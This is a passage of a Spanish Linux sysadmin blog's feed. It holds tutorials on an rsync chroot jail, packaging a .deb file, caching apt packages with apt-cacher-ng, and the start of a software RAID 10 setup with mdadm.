&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@developer:~$ ssh web@10.0.0.2
web@10.0.0.2&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Dec &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;21&lt;/span&gt;:12:44 &lt;span class="m"&gt;2015&lt;/span&gt; from &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3

This account is restricted by rssh.
Allowed commands: rsync 

If you believe this is in error, please contact your system administrator.

Connection to &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 closed.
gerard@developer:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a usar &lt;em&gt;rsync&lt;/em&gt; para sincronizar este proyecto con el servidor que acabamos de montar. Para eso, la máquina cliente necesita tener instalado el paquete &lt;strong&gt;rsync&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@developer:~$ rsync -rvzc --delete web/ web@10.0.0.2:/www
web@10.0.0.2&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
sending incremental file list
index.html

sent &lt;span class="m"&gt;139&lt;/span&gt; bytes  received &lt;span class="m"&gt;35&lt;/span&gt; bytes  &lt;span class="m"&gt;49&lt;/span&gt;.71 bytes/sec
total size is &lt;span class="m"&gt;12&lt;/span&gt;  speedup is &lt;span class="m"&gt;0&lt;/span&gt;.07
gerard@developer:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si repetimos el comando, vemos que la lista de ficheros no incluye el &lt;em&gt;index.html&lt;/em&gt;, porque no ha cambiado respecto a lo que tenemos en el servidor, así que no lo manda.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@developer:~$ rsync -rvzc --delete web/ web@10.0.0.2:/www
web@10.0.0.2&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
sending incremental file list

sent &lt;span class="m"&gt;83&lt;/span&gt; bytes  received &lt;span class="m"&gt;12&lt;/span&gt; bytes  &lt;span class="m"&gt;7&lt;/span&gt;.60 bytes/sec
total size is &lt;span class="m"&gt;12&lt;/span&gt;  speedup is &lt;span class="m"&gt;0&lt;/span&gt;.13
gerard@developer:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;los &lt;em&gt;flags&lt;/em&gt; elegidos son &lt;strong&gt;-r&lt;/strong&gt; (recursivo), &lt;strong&gt;-v&lt;/strong&gt; (verbose), &lt;strong&gt;-z&lt;/strong&gt; (comprimido), &lt;strong&gt;-c&lt;/strong&gt; (diferenciar por &lt;em&gt;checksum&lt;/em&gt;) y &lt;strong&gt;--delete&lt;/strong&gt; (para borrar fichero que estén en el servidor y no deban).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANTE&lt;/strong&gt;: la carpeta origen acaba con &lt;em&gt;/&lt;/em&gt;. Esa es la diferencia entre copiar el contenido de la carpeta y copiar la carpeta misma.&lt;/p&gt;
&lt;p&gt;Analizamos el resultado y vemos que lo hemos copiado en &lt;em&gt;/www/&lt;/em&gt;, siempre desde el punto de vista de la jaula.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# ls /www
ls: no se puede acceder a /www: No existe el fichero o el directorio
root@webserver:~# tree /srv/jails/web/
/srv/jails/web/
├── etc
│   └── rssh.conf
├── lib
│   ├── ld-linux.so.2
│   ├── libacl.so.1
│   ├── libattr.so.1
│   ├── libc.so.6
│   └── libpopt.so.0
├── usr
│   └── bin
│       ├── rssh
│       └── rsync
└── www
    └── index.html

&lt;span class="m"&gt;5&lt;/span&gt; directories, &lt;span class="m"&gt;9&lt;/span&gt; files
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto está todo hecho. Solo falta instalar el servidor web, pero eso lo dejo pendiente.&lt;/p&gt;</content><category term="linux"></category><category term="rsync"></category><category term="rssh"></category><category term="ssh"></category><category term="ldd"></category><category term="jaula"></category></entry><entry><title>Empaquetando ficheros .deb</title><link href="http://www.linuxsysadmin.ml/2015/12/empaquetando-ficheros-punto-deb.html" rel="alternate"></link><published>2015-12-28T10:00:00+01:00</published><updated>2015-12-28T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-12-28:/2015/12/empaquetando-ficheros-punto-deb.html</id><summary type="html">&lt;p&gt;Una de las grandes ventajas de &lt;em&gt;linux&lt;/em&gt; es su sistema de paquetes. Con ellos es posible instalar de forma fácil un paquete de forma fácil y confiable. Hoy vamos a hacer un paquete &lt;em&gt;.deb&lt;/em&gt; como ejemplo que instale un &lt;em&gt;script&lt;/em&gt; cualquiera en la carpeta &lt;em&gt;/usr/bin/&lt;/em&gt; para su uso cotidiano …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Una de las grandes ventajas de &lt;em&gt;linux&lt;/em&gt; es su sistema de paquetes. Con ellos es posible instalar de forma fácil un paquete de forma fácil y confiable. Hoy vamos a hacer un paquete &lt;em&gt;.deb&lt;/em&gt; como ejemplo que instale un &lt;em&gt;script&lt;/em&gt; cualquiera en la carpeta &lt;em&gt;/usr/bin/&lt;/em&gt; para su uso cotidiano.&lt;/p&gt;
&lt;p&gt;Por limpieza, vamos a crear una carpeta temporal para hacer el empaquetado, desde donde vamos a ejecutar todo el resto del procedimiento.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~# mkdir workspace
root@packager:~# &lt;span class="nb"&gt;cd&lt;/span&gt; workspace/
root@packager:~/workspace# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Preparación de la estructura del paquete&lt;/h2&gt;
&lt;p&gt;Vamos a poner el &lt;em&gt;script&lt;/em&gt; que queramos empaquetar, respetando al estructura que tendrá una vez se instale el paquete. También le damos los permisos que va a tener una vez instalado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~/workspace# mkdir -p usr/bin
root@packager:~/workspace# cat usr/bin/welcome
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;
root@packager:~/workspace# chmod &lt;span class="m"&gt;755&lt;/span&gt; usr/bin/welcome
root@packager:~/workspace# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Empaquetado de la carpeta de trabajo&lt;/h2&gt;
&lt;p&gt;Antes de empaquetar de acuerdo a las políticas de los paquetes &lt;em&gt;.deb&lt;/em&gt;, sea en &lt;em&gt;Debian&lt;/em&gt; o en &lt;em&gt;Ubuntu&lt;/em&gt;, se requiere de una carpeta &lt;strong&gt;DEBIAN&lt;/strong&gt; con un fichero &lt;strong&gt;control&lt;/strong&gt;, que va a contener los metadatos del paquete.&lt;/p&gt;
&lt;p&gt;Para este fichero nos podemos guiar por la &lt;a href="https://www.debian.org/doc/debian-policy/ch-controlfields.html"&gt;documentación oficial&lt;/a&gt;. Como vamos a hacer un paquete mínimo, vamos a poner solamente los campos obligatorios y uno de los opcionales, que indicarán las necesidades de nuestro script:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Obligatorios&lt;/strong&gt;:&lt;ul&gt;
&lt;li&gt;Package&lt;/li&gt;
&lt;li&gt;Version&lt;/li&gt;
&lt;li&gt;Architecture compilado los binarios&lt;/li&gt;
&lt;li&gt;Maintainer&lt;/li&gt;
&lt;li&gt;Description&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Opcionales&lt;/strong&gt;:&lt;ul&gt;
&lt;li&gt;Depends&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para que el &lt;em&gt;script&lt;/em&gt; pueda funcionar, hay que localizar todo aquello que pueda necesitar, y añadirlo al paquete o declarar los paquetes de los que dependa, para que se puedan instalar automáticamente si no estuvieran en el sistema destino.&lt;/p&gt;
&lt;p&gt;Concretamente, este &lt;em&gt;script&lt;/em&gt; necesita dos comandos para funcionar: &lt;strong&gt;bash&lt;/strong&gt; y &lt;strong&gt;echo&lt;/strong&gt;. Vamos a localizarlos a ver de que paquete provienen. La idea es que nuestro paquete va a necesitar todos los paquetes que contengan los comandos necesarios, sin necesidad de incorporarlos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~/workspace# which bash
/bin/bash
root@packager:~/workspace# dpkg -S /bin/bash
bash: /bin/bash
root@packager:~/workspace# which &lt;span class="nb"&gt;echo&lt;/span&gt;
/bin/echo
root@packager:~/workspace# dpkg -S /bin/echo 
coreutils: /bin/echo
root@packager:~/workspace# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De ahí deducimos que necesitamos los paquetes &lt;strong&gt;bash&lt;/strong&gt; y &lt;strong&gt;coreutils&lt;/strong&gt;, que aunque suelen venir de serie, vale la pena declararlos por si no fuera el caso. Esto es lo que va en el campo &lt;strong&gt;Depends&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Reuniendo estos datos, podemos crear el fichero &lt;strong&gt;control&lt;/strong&gt;, por ejemplo, como este:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~/workspace# mkdir -p DEBIAN
root@packager:~/workspace# cat DEBIAN/control 
Package: welcome
Version: &lt;span class="m"&gt;1&lt;/span&gt;.0-1
Architecture: all
Maintainer: Linux Sysadmin
Description: A fancy shell script
 To demonstrate how to package a .deb file
Depends: bash, coreutils
root@packager:~/workspace# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Adicionalmente, la carpeta &lt;strong&gt;DEBIAN&lt;/strong&gt; puede contener otros &lt;em&gt;scripts&lt;/em&gt;, como por ejemplo, &lt;strong&gt;preinst&lt;/strong&gt;, &lt;strong&gt;postinst&lt;/strong&gt;, &lt;strong&gt;prerm&lt;/strong&gt; y &lt;strong&gt;postrm&lt;/strong&gt;, que podrían, por ejemplo, crear los usuarios necesarios.&lt;/p&gt;
&lt;p&gt;Como último paso, vamos a invocar el comando &lt;strong&gt;dpkg-deb&lt;/strong&gt; para empaquetar la carpeta de trabajo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~/workspace# &lt;span class="nb"&gt;cd&lt;/span&gt; ..
root@packager:~# dpkg-deb --build workspace/ welcome_1.0-1_all.deb
dpkg-deb: construyendo el paquete &lt;span class="sb"&gt;`&lt;/span&gt;welcome&lt;span class="s1"&gt;&amp;#39; en `welcome_1.0-1_all.deb&amp;#39;&lt;/span&gt;.
root@packager:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobación de que el paquete funciona&lt;/h2&gt;
&lt;p&gt;Vamos a comprobar que el paquete no está instalado, por ejemplo buscando el &lt;em&gt;script&lt;/em&gt; que hemos empaquetado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~# which welcome
root@packager:~# welcome 
bash: /usr/bin/welcome: No existe el fichero o el directorio
root@packager:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Efectivamente, no lo está; ahora se trata de invocar &lt;strong&gt;dpkg&lt;/strong&gt; para instalar nuestro paquete.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~# dpkg -i welcome_1.0-1_all.deb 
Seleccionando el paquete welcome previamente no seleccionado.
&lt;span class="o"&gt;(&lt;/span&gt;Leyendo la base de datos ... &lt;span class="m"&gt;9984&lt;/span&gt; ficheros o directorios instalados actualmente.&lt;span class="o"&gt;)&lt;/span&gt;
Preparando para desempaquetar welcome_1.0-1_all.deb ...
Desempaquetando welcome &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0-1&lt;span class="o"&gt;)&lt;/span&gt; ...
Configurando welcome &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0-1&lt;span class="o"&gt;)&lt;/span&gt; ...
root@packager:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente, verificamos que tenemos nuestro &lt;em&gt;script&lt;/em&gt; en &lt;em&gt;/usr/bin/&lt;/em&gt; como esperábamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~# which welcome
/usr/bin/welcome
root@packager:~# welcome
Hello world!
root@packager:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestro paquete que podemos poner a buen recaudo.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="ubuntu"></category><category term="paquete"></category><category term=".deb"></category></entry><entry><title>Utilizando apt-cacher-ng para agilizar la instalación de paquetes</title><link href="http://www.linuxsysadmin.ml/2015/12/utilizando-apt-cacher-ng-para-agilizar-la-instalacion-de-paquetes.html" rel="alternate"></link><published>2015-12-21T10:00:00+01:00</published><updated>2015-12-21T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-12-21:/2015/12/utilizando-apt-cacher-ng-para-agilizar-la-instalacion-de-paquetes.html</id><summary type="html">&lt;p&gt;Hace tiempo veo que tras usar muchas maquinas virtuales &lt;em&gt;Debian&lt;/em&gt; para el uso diario y para las demostraciones de este blog, el ancho de banda usado para bajar los paquetes se dispara. La mayoría de veces se trata de los mismos paquetes, para instalar las mismas aplicaciones, servicios o actualizaciones …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hace tiempo veo que tras usar muchas maquinas virtuales &lt;em&gt;Debian&lt;/em&gt; para el uso diario y para las demostraciones de este blog, el ancho de banda usado para bajar los paquetes se dispara. La mayoría de veces se trata de los mismos paquetes, para instalar las mismas aplicaciones, servicios o actualizaciones.&lt;/p&gt;
&lt;p&gt;En el artículo de hoy, voy a enseñar como usar un &lt;em&gt;proxy&lt;/em&gt; con una &lt;em&gt;caché&lt;/em&gt; para &lt;em&gt;apt-get&lt;/em&gt;, llamado &lt;strong&gt;apt-cacher-ng&lt;/strong&gt;, de forma que los paquetes son descargados por la primera máquina que los pida, guardados en un servidor local y aprovechados por el resto de máquinas.&lt;/p&gt;
&lt;h2&gt;Preparación de las máquinas&lt;/h2&gt;
&lt;p&gt;Partimos de la máquina habitual, llamada &lt;strong&gt;aptcacher&lt;/strong&gt;, siendo esta un contenedor LXC con una &lt;em&gt;Debian Jessie&lt;/em&gt; básica, aunque esto se podría haber puesto en una &lt;em&gt;Ubuntu&lt;/em&gt; o cualquier otra distribución que funcione con paquetes &lt;em&gt;.deb&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Otras máquinas que vamos a usar son unas máquinas cliente en donde vamos a instalar paquetes cualesquiera para demostrar el funcionamiento, llamadas &lt;strong&gt;client1&lt;/strong&gt; y &lt;strong&gt;client2&lt;/strong&gt;; estos clientes están en la misma red que la máquina &lt;strong&gt;aptcacher&lt;/strong&gt; y tienen conectividad con ella por el puerto &lt;em&gt;TCP&lt;/em&gt; 3142.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME       STATE    IPV4      IPV6  AUTOSTART  
---------------------------------------------
aptcacher  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2  -     YES        
client1    RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3  -     YES        
client2    RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4  -     YES        
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Empezamos instalando el servicio &lt;strong&gt;apt-cacher-ng&lt;/strong&gt; en la máquina servidor &lt;strong&gt;aptcacher&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aptcacher:~# apt-get install apt-cacher-ng
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
...  
Se instalarán los siguientes paquetes NUEVOS:
  apt-cacher-ng ed
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;2&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;500&lt;/span&gt; kB de archivos.
Se utilizarán &lt;span class="m"&gt;1&lt;/span&gt;.168 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@aptcacher:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Las configuraciones que vienen por defecto son bastante adecuadas y no tuve que efectuar ningún cambio.&lt;/p&gt;
&lt;p&gt;Por otra parte, hay que configurar las máquinas que se quieran beneficiar de este servidor, añadiendo una línea de configuración en su &lt;strong&gt;apt-get&lt;/strong&gt;, por ejemplo, poniendo un fichero adicional en &lt;em&gt;/etc/apt/apt.conf.d/&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aptcacher:~# cat /etc/apt/apt.conf.d/02proxy 
Acquire::http &lt;span class="o"&gt;{&lt;/span&gt; Proxy &lt;span class="s2"&gt;&amp;quot;http://10.0.0.2:3142&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
root@aptcacher:~# 

root@client1:~# cat /etc/apt/apt.conf.d/02proxy 
Acquire::http &lt;span class="o"&gt;{&lt;/span&gt; Proxy &lt;span class="s2"&gt;&amp;quot;http://10.0.0.2:3142&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
root@client1:~# 

root@client2:~# cat /etc/apt/apt.conf.d/02proxy 
Acquire::http &lt;span class="o"&gt;{&lt;/span&gt; Proxy &lt;span class="s2"&gt;&amp;quot;http://10.0.0.2:3142&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
root@client2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto queda montado todo el sistema.&lt;/p&gt;
&lt;h2&gt;Funcionamiento de la caché&lt;/h2&gt;
&lt;p&gt;El funcionamiento es muy simple: basta con instalar en un cliente un paquete, por ejemplo, &lt;em&gt;python&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client1:~# apt-get install python
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
...  
Se instalarán los siguientes paquetes NUEVOS:
  file libexpat1 libffi6 libmagic1 libpython-stdlib libpython2.7-minimal
  libpython2.7-stdlib libsqlite3-0 mime-support python python-minimal
  python2.7 python2.7-minimal
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;13&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;5&lt;/span&gt;.010 kB de archivos.
Se utilizarán &lt;span class="m"&gt;21&lt;/span&gt;,3 MB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
Descargados &lt;span class="m"&gt;5&lt;/span&gt;.010 kB en 15s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;327&lt;/span&gt; kB/s&lt;span class="o"&gt;)&lt;/span&gt;                                        
...
root@client1:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como estos paquetes no están en la &lt;em&gt;caché&lt;/em&gt; del servidor, se han descargado de internet en 15 segundos, de acuerdo a la velocidad de mi conexión de internet y de la velocidad de respuesta de los repositorios elegidos.&lt;/p&gt;
&lt;p&gt;Si revisamos la página de estadísticas de &lt;strong&gt;apt-cacher-ng&lt;/strong&gt;, disponible en &lt;em&gt;http://aptcacher:3142/acng-report.html&lt;/em&gt; podemos ver que se han descargado 4,78mb en 13 paquetes; todos son &lt;strong&gt;miss&lt;/strong&gt; de la cache, es decir, se han ido a buscar al repositorio oficial.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Estadísticas web de apt-cacher" src="http://www.linuxsysadmin.ml/images/apt-cacher-ng-1.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Ahora vamos a instalar &lt;em&gt;python&lt;/em&gt; en otro de los clientes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client2:~# apt-get install python
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
...
Se instalarán los siguientes paquetes NUEVOS:
  file libexpat1 libffi6 libmagic1 libpython-stdlib libpython2.7-minimal
  libpython2.7-stdlib libsqlite3-0 mime-support python python-minimal
  python2.7 python2.7-minimal
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;13&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;5&lt;/span&gt;.010 kB de archivos.
Se utilizarán &lt;span class="m"&gt;21&lt;/span&gt;,3 MB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
Descargados &lt;span class="m"&gt;5&lt;/span&gt;.010 kB en 1s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.902 kB/s&lt;span class="o"&gt;)&lt;/span&gt;
root@client2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hemos elegido el paquete &lt;em&gt;python&lt;/em&gt; para asegurar que ambas máquinas instalan lo mismo; como se puede ver, se ha descargado la misma cantidad de datos, pero en vez de los 15 segundos anteriores, ahora se ha tardado 1 segundo. Eso es porque los paquetes solicitados estaban en el &lt;em&gt;proxy&lt;/em&gt;, es decir, en el servidor &lt;strong&gt;aptcacher&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Podemos ver en la misma página de administración el resultado: ahora hay 13 &lt;strong&gt;hits&lt;/strong&gt; adicionales, ya que los paquetes solicitados estaban en local.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Estadísticas web de apt-cacher" src="http://www.linuxsysadmin.ml/images/apt-cacher-ng-2.jpg"&gt;&lt;/p&gt;
&lt;p&gt;De esta forma, si tenemos un elevado número de máquinas del mismo tipo, solo consumiremos el ancho de banda necesario para traerlos de internet &lt;strong&gt;una sola vez&lt;/strong&gt;.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="apt-cacher-ng"></category><category term="cache"></category></entry><entry><title>Construyendo un RAID 10 en linux</title><link href="http://www.linuxsysadmin.ml/2015/12/construyendo-un-raid-10-en-linux.html" rel="alternate"></link><published>2015-12-17T23:00:00+01:00</published><updated>2015-12-17T23:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-12-17:/2015/12/construyendo-un-raid-10-en-linux.html</id><summary type="html">&lt;p&gt;El otro día estaba habilitando un servidor de &lt;em&gt;mongodb&lt;/em&gt; para un entorno de producción. Como me interesaba mejorar el rendimiento de los accesos a disco y no disponía de discos SSD con una durabilidad aceptable, me propuse montar un &lt;em&gt;array de discos&lt;/em&gt; en configuración de &lt;strong&gt;RAID 10&lt;/strong&gt;, como se recomienda …&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día estaba habilitando un servidor de &lt;em&gt;mongodb&lt;/em&gt; para un entorno de producción. Como me interesaba mejorar el rendimiento de los accesos a disco y no disponía de discos SSD con una durabilidad aceptable, me propuse montar un &lt;em&gt;array de discos&lt;/em&gt; en configuración de &lt;strong&gt;RAID 10&lt;/strong&gt;, como se recomienda.&lt;/p&gt;
&lt;p&gt;Para este tutorial vamos a tener una máquina virtual (es una &lt;em&gt;Debian&lt;/em&gt;, pero vale cualquier otra distribución) con 5 discos, 1 de sistema y otros 4 para usar en la configuración &lt;strong&gt;RAID 10&lt;/strong&gt;, cada uno con 8gb, a efecto de demostración.&lt;/p&gt;
&lt;p&gt;En este caso, el sistema operativo estaba en &lt;em&gt;/dev/sda&lt;/em&gt; y sus particiones, mientras que los discos para los datos de &lt;em&gt;mongodb&lt;/em&gt; fueron &lt;em&gt;/dev/sdb&lt;/em&gt;, &lt;em&gt;/dev/sdc&lt;/em&gt;, &lt;em&gt;/dev/sdd&lt;/em&gt;, &lt;em&gt;/dev/sde&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ls /dev/sd* -1
/dev/sda
/dev/sda1
/dev/sdb
/dev/sdc
/dev/sdd
/dev/sde
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creación del dispositivo RAID 10&lt;/h2&gt;
&lt;p&gt;Empezamos instalando el controlador de &lt;strong&gt;RAID&lt;/strong&gt; por software:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install mdadm
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias       
Leyendo la información de estado... Hecho
..
Se instalarán los siguientes paquetes NUEVOS:
  bsd-mailx exim4-base exim4-config exim4-daemon-light liblockfile-bin
  liblockfile1 mdadm psmisc
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;8&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
...
update-initramfs: Generating /boot/initrd.img-3.16.0-4-586
W: mdadm: /etc/mdadm/mdadm.conf defines no arrays.
W: mdadm: no arrays defined in configuration file.
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con las herramientas instaladas, procedemos a crear un &lt;em&gt;/dev/md0&lt;/em&gt; que será nuestro &lt;strong&gt;disco RAID&lt;/strong&gt;, indicando el nivel &lt;strong&gt;RAID 10&lt;/strong&gt; y los 4 discos reales que van a formarlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mdadm -v --create /dev/md0 --level&lt;span class="o"&gt;=&lt;/span&gt;raid10 --raid-devices&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt; /dev/sdb /dev/sdc /dev/sdd /dev/sde
mdadm: layout defaults to n2
mdadm: layout defaults to n2
mdadm: chunk size defaults to 512K
mdadm: size &lt;span class="nb"&gt;set&lt;/span&gt; to 8380416K
mdadm: Defaulting to version &lt;span class="m"&gt;1&lt;/span&gt;.2 metadata
mdadm: array /dev/md0 started.
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para que ese array de discos sea reconocido en cada inicio del sistema, hay que añadir en &lt;em&gt;/etc/mdadm/mdadm.conf&lt;/em&gt; la información relacionada al array, de la misma forma que la tengamos en este momento.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mdadm --detail --scan --verbose &amp;gt;&amp;gt; /etc/mdadm/mdadm.conf
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya tenemos nuestro dispositivo &lt;strong&gt;RAID 10&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Preparación del dispositivo&lt;/h2&gt;
&lt;p&gt;Ahora disponemos de un &lt;strong&gt;RAID 10&lt;/strong&gt; de 4 discos de 8gb, que corresponden a una capacidad total de 16gb utilizables, como el dispositivo &lt;em&gt;/dev/md0&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Este dispositivo es transparente para nosotros y no es diferente de cualquier otro dispositivo de bloques, con lo que se puede particionar, formatear e incluso actuar como un &lt;em&gt;physical volume&lt;/em&gt; en caso de usar &lt;strong&gt;LVM&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Para esta demostración, se creará una única partición que ocupe todo el disco y que será montada en &lt;em&gt;/data&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Así pues, sin mas preámbulo la particionamos; en mi caso lo hice con &lt;em&gt;cfdisk&lt;/em&gt;. Este es el resultado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# fdisk -l /dev/md0

